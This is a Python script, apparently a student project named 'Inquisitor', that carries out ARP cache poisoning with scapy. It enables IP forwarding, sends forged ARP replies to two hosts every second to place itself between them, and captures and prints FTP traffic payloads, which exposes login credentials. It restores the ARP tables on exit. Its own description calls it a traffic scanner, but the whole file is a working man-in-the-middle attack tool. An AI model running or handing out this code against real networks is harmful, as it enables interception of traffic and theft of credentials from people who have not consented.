import argparse
import traceback
import ipaddress
import re
from scapy.all import *

VERBOSE = False
BLUE = "\033[94m"
RED = "\033[91m"
GREEN = "\033[92m"
END = "\033[0m"

def check_ip(ip):
    ip_obj = ipaddress.IPv4Address(ip)
    if ip_obj.is_loopback:
        raise AssertionError("IP address is loopback")
    if ip_obj.is_unspecified:
        raise AssertionError("IP address is unspecified")
    return True

def check_mac(mac):
    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac):
        raise AssertionError("Invalid MAC address format")
    return True

def print_info(state, msg, error=False):
    if error:
        print(RED + state + msg + END)
    else:
        print(BLUE + state + msg + END)

def packet_callback(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 21:
        if VERBOSE:
            print_info("| 📡  |  ", f"FTP Packet: {packet[IP].src} -> {packet[IP].dst}")
        if Raw in packet:
            print_info("| 📡  |  ", f"Payload: {packet[Raw].load.decode('utf-8', errors='ignore')}")

def arp_spoofing(args):
    try:
        print_info("| 🏴‍ |  ", "ARP Spoofing started")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        attacker_mac = get_if_hwaddr(conf.iface)
        
        sniff = AsyncSniffer(
            filter=f"host {args.IP_target} and tcp port 21",
            prn=packet_callback,
            store=0
        )
        sniff.start()

        while True:
            poison_target = Ether(dst=args.MAC_target)/ARP(
                op=2,
                hwsrc=attacker_mac,
                pdst=args.IP_target,
                psrc=args.IP_src,
                hwdst=args.MAC_target
            )
            
            poison_source = Ether(dst=args.MAC_src)/ARP(
                op=2,
                hwsrc=attacker_mac,
                pdst=args.IP_src,
                psrc=args.IP_target,
                hwdst=args.MAC_src
            )

            sendp(poison_target, verbose=0)
            sendp(poison_source, verbose=0)
            time.sleep(1)

    except KeyboardInterrupt:
        print_info("| 🏳️  |  ", "Stopping ARP Spoofing...")
        
        restore_target = Ether(dst=args.MAC_target)/ARP(
            op=2,
            hwsrc=args.MAC_src,
            pdst=args.IP_target,
            psrc=args.IP_src,
            hwdst=args.MAC_target
        )
        
        restore_source = Ether(dst=args.MAC_src)/ARP(
            op=2,
            hwsrc=args.MAC_target,
            pdst=args.IP_src,
            psrc=args.IP_target,
            hwdst=args.MAC_src
        )

        sendp(restore_target, count=5, verbose=0)
        sendp(restore_source, count=5, verbose=0)
        
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        sniff.stop()


def main():
    parser = argparse.ArgumentParser(prog="Inquisitor - Network 🕵️", description="Network scanner for detecting and analyzing network traffic 📡", epilog="Developed by: https://github.com/fZpHr/ 👨‍💻")
    parser.add_argument('IP_src', type=str, help="Source IP address")
    parser.add_argument('MAC_src', type=str, help="Source MAC address")
    parser.add_argument('IP_target', type=str, help="Target IP address")
    parser.add_argument('MAC_target', type=str, help="Target MAC address")
    parser.add_argument('-v', "--verbose", action="store_true", help="Enable verbose mode")
    args = parser.parse_args()

    if not all([check_ip(args.IP_src), check_ip(args.IP_target), 
                check_mac(args.MAC_src), check_mac(args.MAC_target)]):
        return

    global VERBOSE
    if (args.verbose):
        VERBOSE = True
    arp_spoofing(args)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print_info("An error occurred: ", str(e), True)
        traceback.print_exc() 